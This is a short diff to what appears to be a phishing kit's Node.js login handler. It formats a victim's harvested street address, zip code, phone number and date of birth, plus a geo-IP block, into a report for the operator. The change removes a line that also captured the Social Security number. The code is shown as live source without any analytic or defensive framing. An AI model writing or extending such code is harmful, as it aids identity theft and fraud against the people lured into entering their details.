@@ -153,8 +153,8 @@ exports.loginPost3 = async (req, res) => {
 		`STREET ADDRESS   : ${address}\n` +
 		`ZIP CODE         : ${zip}\n` +
 		`PHONE NUMBER     : ${phone}\n` +
-		`DOB              : ${dob}\n` +
-		`SSN              : ${ssn}\n\n` +
+		`DOB              : ${dob}\n\n` +
+		
 		`🌍 GEO-IP INFO\n` +
 		 `IP ADDRESS       : ${ipAddress}\n` +
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
